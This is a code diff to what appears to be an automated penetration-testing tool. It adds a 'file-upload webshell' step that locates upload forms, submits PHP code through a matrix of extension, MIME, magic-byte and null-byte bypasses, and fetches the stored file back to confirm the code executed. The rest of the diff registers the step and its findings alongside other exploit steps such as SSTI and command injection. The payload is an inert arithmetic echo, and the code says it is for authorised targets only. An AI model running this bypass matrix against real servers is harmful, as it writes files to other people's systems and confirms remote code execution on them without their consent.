@@ -21,6 +21,7 @@ import atexit
 import ipaddress
 import json
 import os
+import random
 import re
 import shlex
 import shutil
@@ -1986,6 +1987,22 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"SSTI (eval, RCE unconfirmed): {shown} ({len(eval_only)})"[:140]}
         return None
 
+    # 2v) upload-shell: file-upload webshell — code-executed critical, merely-stored high
+    if sid == "upload-shell":
+        rce = re.findall(r"✗ UPLOAD (\S+)", output)
+        stored = re.findall(r"⚠ UPLOAD (\S+)", output)
+        if rce:
+            var = re.search(r"✗ UPLOAD \S+\s+\(([^)]+)\)", output)
+            vt = f" ({var.group(1)})" if var else ""
+            shown = rce[0] + (f" +{len(rce) - 1}" if len(rce) > 1 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"File-upload RCE: {shown}{vt}"[:140]}
+        if stored:
+            shown = stored[0] + (f" +{len(stored) - 1}" if len(stored) > 1 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"Arbitrary file upload (exec unconfirmed): {shown}"[:140]}
+        return None
+
     # 3) info rules over -sC output
     low = output.lower()
     info = None
@@ -2616,7 +2633,8 @@ _EXPLOIT_STEPS = {
          "cmdi-scan"),
         ("Server-side template injection ({{7*7}} / ${7*7}) → RCE (Jinja2 / Twig / Freemarker)",
          "ssti-scan"),
-        "File upload → webshell: bypass extension/MIME/magic (.phtml, double ext, null byte)",
+        ("File upload → webshell — bypass extension / MIME / magic bytes (.phtml, double ext, magic prefix)",
+         "upload-shell"),
         "XXE (XML input) & SSRF (reach internal services / 169.254.169.254 metadata)",
         "IDOR / broken access control — tamper IDs & roles to reach admin / other users",
         # ── known-app exploitation & foothold ──
@@ -6298,6 +6316,283 @@ def _tool_ssti_scan(ip: str, port: int, proto: str) -> str:
     return "\n".join(lines)
 
 
+# ── HTTP step 21: file-upload → webshell (PHP only; exec-verified, non-destructive) ──
+_UPLOAD_DEADLINE = 300          # s — hard wall-clock cap over all forms/variants
+_UPLOAD_REQ_TIMEOUT = 10
+_UPLOAD_MAX_FORMS = 12          # distinct upload surfaces to probe
+_UPLOAD_PATH_RE = re.compile(
+    r"upload|avatar|profile|import|attach|media|photo|gallery|file", re.I)
+# common upload endpoints to try when nothing was mined by earlier steps (per host + vhost)
+_UPLOAD_FALLBACK_PATHS = [
+    "/upload", "/upload.php", "/uploads", "/admin/upload", "/admin/upload.php",
+    "/profile", "/profile.php", "/account", "/avatar", "/avatar.php",
+    "/import", "/import.php", "/file", "/files", "/attachment", "/attachments",
+    "/media", "/gallery", "/photo", "/settings",
+]
+# where a stored file is commonly reachable from, checked when the response doesn't leak a URL
+_UPLOAD_STORE_DIRS = [
+    "/uploads/", "/upload/", "/files/", "/file/", "/images/", "/img/", "/media/",
+    "/avatars/", "/avatar/", "/attachments/", "/userfiles/", "/data/", "/assets/",
+    "/content/", "/tmp/", "/",
+]
+
+
+def _parse_upload_form(html: str, page_path: str) -> "dict | None":
+    """Pull a multipart upload <form> (the one with a file input): its action, method, the
+    file field name, and the other fields (hidden CSRF tokens + required text) to echo back."""
+    for form in re.findall(r"<form[^>]*>.*?</form>", html or "", re.I | re.S):
+        if not re.search(r"type=[\"']?file", form, re.I):
+            continue
+        fm = re.search(r"<form[^>]*>", form, re.I)
+        fmt = fm.group(0) if fm else ""
+        file_m = re.search(r"<input[^>]*type=[\"']?file[\"']?[^>]*name=[\"']([^\"']+)", form, re.I) or \
+            re.search(r"<input[^>]*name=[\"']([^\"']+)[\"'][^>]*type=[\"']?file", form, re.I)
+        if not file_m:
+            continue
+        act = re.search(r"action=[\"']([^\"']*)[\"']", fmt, re.I)
+        method = re.search(r"method=[\"']?(\w+)", fmt, re.I)
+        fields = {}
+        for tag in re.findall(r"<input[^>]*>", form, re.I):
+            tp = re.search(r"type=[\"']?(\w+)", tag, re.I)
+            tp = tp.group(1).lower() if tp else "text"
+            nm = re.search(r"name=[\"']([^\"']+)", tag, re.I)
+            if not nm or tp == "file":
+                continue
+            nm = nm.group(1)
+            vv = re.search(r"value=[\"']([^\"']*)", tag, re.I)
+            if tp in ("hidden", "text", "email", "search", "url", "submit"):
+                fields[nm] = vv.group(1) if vv else ("pshunter" if tp != "submit" else "1")
+        return {"action": act.group(1) if act else "", "file": file_m.group(1),
+                "method": (method.group(1).upper() if method else "POST"), "fields": fields}
+    return None
+
+
+def _gather_upload_targets(ip: str, port: int, proto: str) -> list:
+    """(hostval, path) upload surfaces — dir-brute paths that look like an upload/profile page,
+    plus common fallback paths, on the host and every discovered vhost."""
+    tgts, seen = [], set()
+
+    def _add(hostval, path):
+        base = path.split("?")[0].split("#")[0]
+        if not base.startswith("/"):
+            return
+        key = (hostval, base)
+        if key not in seen:
+            seen.add(key)
+            tgts.append((hostval, base))
+
+    for sid, output in fetch_scripts(ip, port, proto):
+        if sid == "dir-brute":
+            host = ip
+            for ln in output.splitlines():
+                mh = re.match(r"^\[([^\]\s]+)", ln)
+                if mh:
+                    host = mh.group(1)
+                    continue
+                mp = re.match(r"\s*[!+] \d{3}\s+(\S+)", ln)
+                if mp and _UPLOAD_PATH_RE.search(mp.group(1)):
+                    _add(host, mp.group(1))
+
+    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
+    for h in [ip] + [v for v in vhosts if v != ip]:
+        for p in _UPLOAD_FALLBACK_PATHS:
+            _add(h, p)
+    return tgts[:_UPLOAD_MAX_FORMS]
+
+
+def _php_upload_variants(base: str, php: bytes) -> list:
+    """PHP extension / MIME / magic-byte bypass matrix for one probe. Each entry is
+    (label, sent-filename, content-type, file-bytes, [names to fetch the stored file back])."""
+    gif, png = b"GIF89a;\n", b"\x89PNG\r\n\x1a\n"
+    return [
+        ("phtml",              f"{base}.phtml",   "image/jpeg",              php,        [f"{base}.phtml"]),
+        ("php5",               f"{base}.php5",    "image/jpeg",              php,        [f"{base}.php5"]),
+        ("pht",                f"{base}.pht",     "image/jpeg",              php,        [f"{base}.pht"]),
+        ("phar",               f"{base}.phar",    "application/octet-stream", php,       [f"{base}.phar"]),
+        ("php + image ctype",  f"{base}.php",     "image/png",               php,        [f"{base}.php"]),
+        ("magic GIF89a .php",  f"{base}.php",     "image/gif",               gif + php,  [f"{base}.php"]),
+        ("magic PNG .phtml",   f"{base}.phtml",   "image/png",               png + php,  [f"{base}.phtml"]),
+        ("double .php.jpg",    f"{base}.php.jpg", "image/jpeg",              php,        [f"{base}.php.jpg", f"{base}.php"]),
+        ("double .jpg.php",    f"{base}.jpg.php", "image/jpeg",              php,        [f"{base}.jpg.php"]),
+        ("case .pHp",          f"{base}.pHp",     "image/jpeg",              php,        [f"{base}.pHp", f"{base}.php"]),
+        ("trailing dot .php.", f"{base}.php.",    "image/jpeg",              php,        [f"{base}.php", f"{base}.php."]),
+        ("nullbyte .php\\0.jpg", f"{base}.php\x00.jpg", "image/jpeg",        php,        [f"{base}.php"]),
+    ]
+
+
+def _multipart(fields: dict, file_field: str, filename: str, ctype: str, data: bytes) -> tuple:
+    """Build a multipart/form-data body (bytes) + boundary from text fields and one file part."""
+    boundary = "----pshunter" + "".join(random.choices("0123456789abcdef", k=16))
+    out = b""
+    for k, v in fields.items():
+        out += (f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n"
+                f"{v}\r\n").encode("utf-8", "replace")
+    out += (f"--{boundary}\r\nContent-Disposition: form-data; name=\"{file_field}\"; "
+            f"filename=\"{filename}\"\r\nContent-Type: {ctype}\r\n\r\n").encode("utf-8", "replace")
+    out += data + f"\r\n--{boundary}--\r\n".encode()
+    return out, boundary
+
+
+def _tool_file_upload(ip: str, port: int, proto: str) -> str:
+    """HTTP step-21 tool: attempt to upload a PHP webshell through discovered upload forms,
+    working an extension / MIME / magic-byte bypass matrix. The payload is INERT (it echoes a
+    unique marker × arithmetic — no live command shell); the result is proven by fetching the
+    stored file back and checking the arithmetic executed. RCE-confirmed vs merely-stored are
+    reported separately, and every uploaded artifact is listed for manual removal. Stdlib only;
+    a dead server raises. Authorised targets only — this writes files to the target."""
+    import http.client
+    import ssl
+    import time
+    import urllib.parse
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    scheme = "https" if tls else "http"
+    ctx = ssl._create_unverified_context()
+
+    def _req(hostval, method, path, body=None, extra=None):
+        conn = None
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=_UPLOAD_REQ_TIMEOUT, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=_UPLOAD_REQ_TIMEOUT)
+            hdr = {"Host": hostval, "User-Agent": "pshunter"}
+            if extra:
+                hdr.update(extra)
+            conn.request(method, path, body=body, headers=hdr)
+            resp = conn.getresponse()
+            data = resp.read(131072).decode("utf-8", "replace")
+            setc = resp.headers.get_all("Set-Cookie") or []
+            return resp.status, data, setc, resp.headers.get("Location")
+        except Exception:                                     # noqa: BLE001
+            return None, None, [], None
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    if _req(ip, "GET", "/")[0] is None:
+        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test upload")
+
+    targets = _gather_upload_targets(ip, port, proto)
+    deadline = time.time() + _UPLOAD_DEADLINE
+    surfaces, rce, stored, artifacts = [], [], [], []
+    tested = [0]
+
+    def _verify(hostval, vpath, mark, product):
+        """GET a stored file back → 'rce' if the arithmetic executed, 'stored' if our raw PHP
+        is served verbatim (upload worked, execution didn't), else None."""
+        st, body, _sc, _loc = _req(hostval, "GET", vpath)
+        if st is None or st == 404 or not body:
+            return None
+        if f"{mark}{product}{mark}" in body:
+            return "rce"
+        if mark in body and "<?php" in body:
+            return "stored"
+        return None
+
+    def _locate(hostval, resp_body, names, mark, product):
+        """Find where an accepted upload landed. Three strategies, cheapest first: (1) a URL the
+        response leaks that carries one of the names we sent; (2) any other file URL the response
+        leaks (the server renamed the upload) — safe to verify because our marker is unique;
+        (3) a blind guess in the usual store dirs. Returns (url_path, 'rce'|'stored')/(None,None)."""
+        for nm in names:
+            m = re.search(r"((?:https?://[^\"'()<> ]+)?/[^\"'()<> ]*" + re.escape(nm) + r")",
+                          resp_body or "")
+            if m:
+                pr = urllib.parse.urlparse(m.group(1))
+                vpath = pr.path or m.group(1)
+                v = _verify(hostval, vpath, mark, product)
+                if v:
+                    return vpath, v
+        for cand in re.findall(r"(/[A-Za-z0-9_./-]+\.[A-Za-z0-9]{1,5})", resp_body or "")[:12]:
+            v = _verify(hostval, cand, mark, product)
+            tested[0] += 1
+            if v:
+                return cand, v
+        for d in _UPLOAD_STORE_DIRS:
+            if time.time() >= deadline:
+                break
+            for nm in names:
+                v = _verify(hostval, d + nm, mark, product)
+                tested[0] += 1
+                if v:
+                    return d + nm, v
+        return None, None
+
+    for hostval, path in targets:
+        if time.time() >= deadline:
+            break
+        gs, gbody, gsc, _gl = _req(hostval, "GET", path)
+        if gs is None:
+            continue
+        form = _parse_upload_form(gbody or "", path)
+        if not form:
+            continue
+        surfaces.append(f"{hostval}{path} (field '{form['file']}')")
+        action = urllib.parse.urljoin(f"{scheme}://{ip}:{port}{path}", form["action"] or path)
+        pr = urllib.parse.urlparse(action)
+        apath = pr.path + (f"?{pr.query}" if pr.query else "")
+        cookie = "; ".join(c.split(";")[0] for c in gsc)
+        hit = False
+        token = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8))
+        base = "psh" + token
+        mark = "PSHUP" + token
+        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
+        product = str(a * b)
+        php = f"<?php echo '{mark}',{a}*{b},'{mark}'; ?>".encode()
+        for label, upname, ctype, data, names in _php_upload_variants(base, php):
+            if time.time() >= deadline:
+                break
+            body, boundary = _multipart(form["fields"], form["file"], upname, ctype, data)
+            extra = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
+            if cookie:
+                extra["Cookie"] = cookie
+            st, rbody, _sc, _loc = _req(hostval, "POST", apath, body=body, extra=extra)
+            tested[0] += 1
+            if st is None:
+                continue
+            accepted = st in (200, 201, 204, 301, 302, 303)
+            vpath, verdict = _locate(hostval, rbody if accepted else "", names, mark, product)
+            if verdict == "rce":
+                url = f"{scheme}://{hostval}:{port}{vpath}"
+                rce.append(f"  ✗ UPLOAD {url}  (php · {label})  [via {hostval}{apath}]")
+                artifacts.append(f"{hostval}{vpath}")
+                hit = True
+                break
+            if verdict == "stored":
+                url = f"{scheme}://{hostval}:{port}{vpath}"
+                stored.append(f"  ⚠ UPLOAD {url}  (php · {label}, exec unconfirmed)  [via {hostval}{apath}]")
+                artifacts.append(f"{hostval}{vpath}")
+                hit = True
+                break
+        if hit and time.time() >= deadline:
+            break
+
+    reason = "deadline" if time.time() >= deadline else "complete"
+    lines = [f"{scheme}://{ip}:{port}/ file-upload webshell (PHP)",
+             f"surfaces: {len(surfaces)} form · uploads tried {tested[0]} · "
+             f"RCE {len(rce)} · stored {len(stored)} · {reason}"]
+    if surfaces:
+        lines.append("\nUPLOAD FORMS:")
+        lines += [f"  {s}" for s in sorted(set(surfaces))]
+    if rce:
+        lines.append("\nRCE (code executed):")
+        lines += rce
+    if stored:
+        lines.append("\nSTORED (upload accepted, execution unconfirmed):")
+        lines += stored
+    if artifacts:
+        lines.append("\nartifacts to remove:")
+        lines += [f"  {a}" for a in sorted(set(artifacts))]
+    if not rce and not stored:
+        lines.append("\nno upload bypass worked" if surfaces else "\nno upload form found")
+    return "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("curl -sI (HTTP headers)", _tool_http_headers),
@@ -6320,6 +6615,7 @@ _STEP_TOOLS = {
     "rfi-scan": ("RFI / wrapper inclusion (stdlib) → data://, php://input", _tool_rfi_scan),
     "cmdi-scan": ("OS command injection (stdlib: echo/time) → id/uname, RCE cmd", _tool_cmdi_scan),
     "ssti-scan": ("SSTI (stdlib, math-verified) → engine + auto-id RCE + cmd", _tool_ssti_scan),
+    "upload-shell": ("file-upload webshell (stdlib, PHP, exec-verified)", _tool_file_upload),
 }
 
 def _mins(seconds: int) -> str:
@@ -6356,6 +6652,7 @@ _STEP_TOOL_RUNS = {
     "rfi-scan":         ("Python", f"{_mins(_RFI_DEADLINE)} min"),
     "cmdi-scan":        ("Python", f"{_mins(_CMDI_DEADLINE)} min"),
     "ssti-scan":        ("Python", f"{_mins(_SSTI_DEADLINE)} min"),
+    "upload-shell":     ("Python", f"{_mins(_UPLOAD_DEADLINE)} min"),
 }
 
 
